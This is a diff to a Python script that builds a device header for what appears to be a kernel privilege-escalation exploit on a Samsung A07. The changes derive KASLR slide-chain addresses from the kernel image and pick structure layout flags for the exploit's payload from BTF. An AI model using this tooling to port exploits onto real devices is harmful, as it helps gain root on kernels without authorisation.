@@ -82,16 +82,10 @@ PROFILE_REQUIRED_MACROS = (
     "SLIDE_PSELECT_WORD_SHIFT",
     "SLIDE_TRACEFS_EVENT_ID",
     "SLIDE_TRACEFS_WORKER_CALLER_OFF",
-    "SLIDE_NFULNL_LOGGER_NAME_OFF",
-    "SLIDE_NFULNL_LOGGER_OBJECT_OFF",
-    "SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF",
-    "SLIDE_SYSCTL_BOOTID_OFF",
     "KMALLOC_CACHE_TYPES",
     "KMALLOC_CGROUP_TYPE",
     "SLIDE_FAKE_WAITER_PRIO",
     "SLIDE_WAITER_WAKE_STATE",
-    "LEGACY_RT_MUTEX_WAITER",
-    "COMPACT_RT_MUTEX_WAITER",
     "SLIDE_LOCK_OWNER_VALUE",
     "SLIDE_USE_FAKE_TASK",
     "SLIDE_RB_PARENT_TYPE_RESTORE",
@@ -590,31 +584,67 @@ def profile_values(profile_path: Path | None) -> tuple[dict[str, Any], dict[str,
         elif personal_data_pattern.search(evidence[name]):
             missing.append(f"{name} (evidence text contains a prohibited personal-data label)")
 
-    waiter_flags: list[int] = []
-    for name in ("LEGACY_RT_MUTEX_WAITER", "COMPACT_RT_MUTEX_WAITER"):
-        raw = values.get(name)
-        if isinstance(raw, bool):
-            flag = int(raw)
-        elif isinstance(raw, int):
-            flag = raw
-        elif isinstance(raw, str):
-            numeric = re.sub(r"(?:ULL|LLU|LL|UL|LU|U|L)$", "", raw.strip(), flags=re.I)
-            try:
-                flag = parse_integer(numeric)
-            except ValueError:
-                missing.append(f"{name} (must be the numeric literal 0 or 1)")
-                continue
-        else:
-            continue
-        if flag not in (0, 1):
-            missing.append(f"{name} (must be 0 or 1)")
-        else:
-            waiter_flags.append(flag)
-    if len(waiter_flags) == 2 and sum(waiter_flags) != 1:
-        missing.append(
-            "select exactly one of LEGACY_RT_MUTEX_WAITER or COMPACT_RT_MUTEX_WAITER"
-        )
     return data, evidence, missing
+
+
+# Slide-chain addresses (src/slide_app.c:1995, src/fops.c:292, src/util.c:1648) that are read out
+# of A07's own kernel image with a self-verifying check, instead of being written into a profile.
+SLIDE_CHAIN_MACROS = (
+    "SLIDE_NFULNL_LOGGER_NAME_OFF",
+    "SLIDE_NFULNL_LOGGER_OBJECT_OFF",
+    "SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF",
+    "SLIDE_SYSCTL_BOOTID_OFF",
+)
+
+# Layout choices the payload source switches on. Each one is decided by what A07's own BTF declares
+# for the struct the payload reads; none of them may be copied from another device's header.
+WAITER_LAYOUT_MEMBER_SETS: dict[str, tuple[str, ...]] = {
+    "LEGACY_RT_MUTEX_WAITER": ("pi_tree_entry", "pi_tree_prio", "pi_tree_deadline"),
+    "COMPACT_RT_MUTEX_WAITER": ("tree_entry", "prio", "deadline"),
+    "NESTED_RT_MUTEX_WAITER": ("tree", "pi_tree"),
+}
+
+
+def waiter_layout_flags(members: set[str]) -> tuple[dict[str, str], str]:
+    """Map the parsed `rt_mutex_waiter` member census onto exactly one source layout flag."""
+    matches = sorted(name for name, required in WAITER_LAYOUT_MEMBER_SETS.items()
+                     if set(required) <= members)
+    if len(matches) != 1:
+        return {}, (
+            "rt_mutex_waiter layout undetermined: the member census matches "
+            + (", ".join(matches) if matches else "none of the layouts src/common.h offers")
+            + f"; parsed members: {', '.join(sorted(members)) or '(none)'}"
+        )
+    flags = {name: ("1" if name == matches[0] else "0") for name in WAITER_LAYOUT_MEMBER_SETS}
+    return flags, (
+        f"{matches[0]}=1 because BTF declares {', '.join(WAITER_LAYOUT_MEMBER_SETS[matches[0]])} "
+        f"on struct rt_mutex_waiter (full member census: {', '.join(sorted(members))})"
+    )
+
+
+def workqueue_max_active_flags(
+    pwq_members: set[str], wq_members: dict[str, int], pwq_wq_offset: int | None = None
+) -> tuple[dict[str, str], str]:
+    """6.12 moved pool_workqueue.max_active onto the workqueue_struct reached through pwq->wq."""
+    if "max_active" in pwq_members:
+        return {"PWQ_MAX_ACTIVE_VIA_WQ": "0"}, (
+            "pool_workqueue still owns max_active, so src/root.c keeps reading pwq + PWQ_MAX_ACTIVE_OFF"
+        )
+    offset = wq_members.get("max_active")
+    if offset is not None and "wq" in pwq_members:
+        wq_member = f"0x{pwq_wq_offset:x}" if pwq_wq_offset is not None else "parsed"
+        return (
+            {"PWQ_MAX_ACTIVE_VIA_WQ": "1", "WQ_MAX_ACTIVE_OFF": f"0x{offset:x}ULL"},
+            f"pool_workqueue has no max_active member; workqueue_struct.max_active is at 0x{offset:x}, "
+            f"reached through pool_workqueue.wq (at {wq_member}), so src/root.c reads the limit from "
+            "the workqueue the pwq points at",
+        )
+    return {}, (
+        "workqueue max_active undetermined: neither pool_workqueue.max_active nor "
+        f"workqueue_struct.max_active was parsed (pool_workqueue members: "
+        f"{', '.join(sorted(pwq_members)) or '(none)'}; workqueue_struct.max_active: "
+        f"{'0x%x' % offset if offset is not None else 'absent'})"
+    )
 
 
 def emit_header(
@@ -625,6 +655,7 @@ def emit_header(
     btf_fields: dict[str, dict[str, int]],
     btf_sizes: dict[str, int],
     profile: dict[str, Any],
+    measured_macros: dict[str, str] | None = None,
 ) -> None:
     macros: dict[str, str] = {
         "TARGET_A07_SM_A075F": "1",
@@ -666,6 +697,11 @@ def emit_header(
     for macro, type_name in BTF_SIZE_MACROS.items():
         if type_name in btf_sizes:
             macros[macro] = f"0x{btf_sizes[type_name]:x}ULL"
+    # Macros measured out of A07's own image and BTF: layout flags and slide-chain addresses. They
+    # outrank profile values, because a hand-written offset or 0/1 flag for these would be exactly
+    # the kind of guess this pipeline refuses to accept.
+    for macro, value in (measured_macros or {}).items():
+        macros[macro] = value
 
     values = profile.get("macros", {})
     for name, value in values.items():
@@ -775,6 +811,9 @@ def main() -> int:
     source_root: Path | None = None
     btf_fields: dict[str, dict[str, int]] = {}
     btf_sizes: dict[str, int] = {}
+    layout_macros: dict[str, str] = {}
+    layout_evidence: dict[str, str] = {}
+    resolved_by_source_port: list[str] = []
     pahole_outputs: dict[str, str] = {}
 
     assets = args.release_assets.resolve()
@@ -1112,6 +1151,15 @@ def main() -> int:
                     continue
                 ensure_type(new_type)
                 relocated = btf_fields.get(new_type, {}).get(old_member)
+                if layout_macros.get("PWQ_MAX_ACTIVE_VIA_WQ") == "1" and macro == "PWQ_MAX_ACTIVE_OFF":
+                    # The member really moved, and src/root.c now reads it from the workqueue it
+                    # reaches through pwq->wq, so this is a completed source port, not a gap.
+                    resolved_by_source_port.append(
+                        f"{old_type}.{old_member} -> {macro}: relocated to workqueue_struct.max_active "
+                        f"= {layout_macros.get('WQ_MAX_ACTIVE_OFF')}, read through pwq->wq "
+                        "(PWQ_MAX_ACTIVE_VIA_WQ=1)"
+                    )
+                    continue
                 missing.append(
                     f"{old_type}.{old_member} -> {macro} has no {old_type}-relative offset in this "
                     f"kernel (member {'is at 0x%x of struct %s' % (relocated, new_type) if relocated is not None else 'was not found in struct ' + new_type + ' either'}); {note}"
@@ -1127,6 +1175,54 @@ def main() -> int:
                 for name in sorted(incomplete_structs)
             }
             waiter = sorted(raw_btf_fields.get("rt_mutex_waiter", {}))
+            waiter_flags, waiter_flag_evidence = waiter_layout_flags(set(waiter))
+            if waiter_flags:
+                layout_macros.update(waiter_flags)
+            else:
+                missing.append(f"rt_mutex_waiter layout flag unresolved: {waiter_flag_evidence}")
+            wq_flags, wq_evidence = workqueue_max_active_flags(
+                set(raw_btf_fields.get("pool_workqueue", {})),
+                btf_fields.get("workqueue_struct", {}),
+                raw_btf_fields.get("pool_workqueue", {}).get("wq"),
+            )
+            if wq_flags:
+                layout_macros.update(wq_flags)
+            else:
+                missing.append(f"workqueue max_active flag unresolved: {wq_evidence}")
+            layout_evidence = {
+                "rt_mutex_waiter": waiter_flag_evidence,
+                "workqueue_max_active": wq_evidence,
+            }
+            slide_chain: dict[str, Any] = {}
+            if selected_kernel is not None and text_base is not None:
+                try:
+                    from tools.a07_elf import ElfImage as SlideElfImage
+                    from tools.derive_a07_image import derive_slide_chain
+
+                    ensure_type("nf_logger")
+                    ensure_type("ctl_table")
+                    slide_chain = derive_slide_chain(
+                        SlideElfImage(selected_kernel), {**btf_fields, "__sizes__": btf_sizes}, text_base
+                    )
+                except Exception as error:
+                    missing.append(f"image-derived slide chain failed: {error}")
+            for macro in SLIDE_CHAIN_MACROS:
+                info = slide_chain.get(macro)
+                if not info:
+                    missing.append(
+                        f"{macro} was not derived from A07's kernel image "
+                        "(needs kernel.elf symbols nfulnl_logger/random_table plus BTF "
+                        "nf_logger.name, ctl_table.procname/.data and sizeof(struct ctl_table))"
+                    )
+                    continue
+                if info.get("status") != "derived" or info.get("value") is None:
+                    missing.append(
+                        f"{macro}: {info.get('status')} - "
+                        f"{info.get('evidence') or info.get('reason') or 'no evidence recorded'}"
+                    )
+                    continue
+                layout_macros[macro] = f"0x{info['value']:x}ULL"
+                layout_evidence[macro] = info.get("evidence", "")
             waiter_candidate = None
             if waiter:
                 legacy_only = {"pi_tree_entry", "pi_tree_prio", "pi_tree_deadline"}
@@ -1138,10 +1234,10 @@ def main() -> int:
                     waiter_candidate = "COMPACT_RT_MUTEX_WAITER=1 (BTF carries tree_entry/prio/deadline)"
                 elif nested <= set(waiter):
                     waiter_candidate = (
-                        "NEITHER FLAG FITS: rt_mutex_waiter embeds `tree`/`pi_tree` node structs, so "
-                        "prio/deadline are nested rather than flat. src/common.h only offers the "
-                        "LEGACY and COMPACT layouts; choosing one for A07 is a source-level porting "
-                        f"decision, not a value to guess. Measured members: {', '.join(waiter)}"
+                        "NESTED_RT_MUTEX_WAITER=1: rt_mutex_waiter embeds `tree`/`pi_tree` "
+                        "rt_waiter_node structs, so prio/deadline are nested instead of flat. "
+                        "src/common.h now names this third layout and the shared `#else` waiter "
+                        f"writers already match it. Measured members: {', '.join(waiter)}"
                     )
                 else:
                     waiter_candidate = (
@@ -1165,6 +1261,10 @@ def main() -> int:
                             for name, fields in sorted(btf_fields.items())
                         },
                         "rtMutexWaiterLayoutCandidate": waiter_candidate,
+                        "layoutMacros": layout_macros,
+                        "imageDerivedSlideChain": slide_chain,
+                        "layoutEvidence": layout_evidence,
+                        "resolvedBySourcePort": resolved_by_source_port,
                         "derivedMembers": derived_members,
                         "incompleteStructDiagnostics": btf_diagnostic,
                     },
@@ -1186,6 +1286,27 @@ def main() -> int:
                     )
                     + "\nDerived offsets are injected only after their cross-checks pass; an\n"
                     "unresolved or failed path stays a reported gap rather than a value.\n"
+                )
+            if slide_chain:
+                sections.append(
+                    "## Slide chain read out of A07's kernel image\n\n"
+                    + "".join(
+                        f"- `{macro}`: **{info.get('status')}**"
+                        + (f" = `0x{info['value']:x}`" if info.get("value") is not None else "")
+                        + f"\n  - {info.get('evidence') or info.get('reason') or ''}\n"
+                        for macro, info in slide_chain.items()
+                    )
+                    + "\nEach address is read from the image and checked against the string or\n"
+                    "pointer the payload expects to find there; a failed check yields no value.\n"
+                )
+            if layout_macros:
+                sections.append(
+                    "## Layout flags derived from A07's own BTF\n\n"
+                    + "".join(f"- `{name}` = `{value}`\n" for name, value in sorted(layout_macros.items()))
+                    + "\n" + "".join(f"- {key}: {text}\n" for key, text in sorted(layout_evidence.items()))
+                    + "".join(f"- resolved by source port: {text}\n" for text in resolved_by_source_port)
+                    + "\nThese select code paths in `src/common.h`/`src/root.c`; they are not\n"
+                    "offsets and they are not copied from another device's header.\n"
                 )
             if waiter_candidate or btf_diagnostic:
                 sections.append(
@@ -1247,6 +1368,7 @@ def main() -> int:
                 btf_fields,
                 btf_sizes,
                 profile,
+                measured_macros=layout_macros,
             )
             metadata = {
                 "model": MODEL,
